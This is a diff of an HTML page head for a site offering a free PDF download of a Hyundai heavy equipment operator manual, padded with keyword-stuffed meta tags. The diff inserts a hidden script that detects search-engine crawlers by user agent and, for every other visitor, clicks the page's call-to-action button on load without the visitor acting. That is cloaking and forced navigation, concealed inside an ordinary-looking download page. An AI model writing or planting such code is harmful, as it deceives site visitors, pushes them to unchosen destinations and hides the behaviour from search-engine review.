@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai Heavy Equipment Operator Manual 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Hyundai Heavy Equipment Operator Manual 05.2024. Covers ranges like Crawler, Wheel Excavators, Loaders, Rollers, and more in PDF format.">
     <meta name="keywords" content="Hyundai Heavy Equipment Operator Manual 05.2024, Hyundai Heavy Equipment Operator Manual PDF, Hyundai Heavy Equipment Operator Manual download, Hyundai Heavy Equipment Operator Manual free download, Hyundai Heavy Equipment Operator Manual 2024, Hyundai Heavy Equipment Manual, Hyundai Heavy Equipment Manual download, Hyundai Heavy Equipment Manual free download, Hyundai Excavator Operator Manual, Hyundai Excavator Operator Manual PDF, Hyundai Excavator Operator Manual download, Hyundai Excavator Operator Manual free download, Crawler Excavator Guide, Wheel Excavator Operation, Wheel Loader Manual, Backhoe Loader Instructions, Skid Steer Loader Guide, Road Roller Manual, Motor Grader Operator Manual, Articulated Dump Truck Guide, Dozer Operation Manual, Hyundai Machinery Manual 05.2024, Construction Equipment Manual, Heavy Machinery Operator Guide, Hyundai Heavy Equipment PDF, hyundai heavy equipment manual, hyundai operator manual, hyundai excavator manual, hyundai wheel loader manual, hyundai backhoe loader manual, hyundai skid steer manual, hyundai road roller manual, hyundai motor grader manual, hyundai dump truck manual, hyundai dozer manual, construction equipment manual, heavy machinery operation guide, hyundai hd130 manual, hyundai hw180a manual, hyundai hx17e manual, hyundai hx55a cr manual, hyundai hx800l manual, heavy equipment maintenance, construction machinery operation, hyundai service information, earthmoving equipment guide, hyundai technical manual, construction vehicle operation, hyundai equipment troubleshooting, heavy machinery safety, construction equipment maintenance, hyundai parts information, earthmoving machinery manual, hyundai operator training, construction vehicle safety, hyundai equipment specifications, heavy machinery operation procedures, construction equipment repair, hyundai machine controls, earthmoving vehicle manual, hyundai operator instructions, construction machinery maintenance, hyundai equipment diagnostics, heavy vehicle operation, construction equipment safety, hyundai machine features, earthmoving equipment operation, hyundai equipment updates, heavy machinery repair guide, construction vehicle operation procedures, руководство по эксплуатации тяжелого оборудования Hyundai 05.2024, скачать руководство по эксплуатации тяжелого оборудования Hyundai, руководство по эксплуатации тяжелого оборудования Hyundai PDF">
     <style>
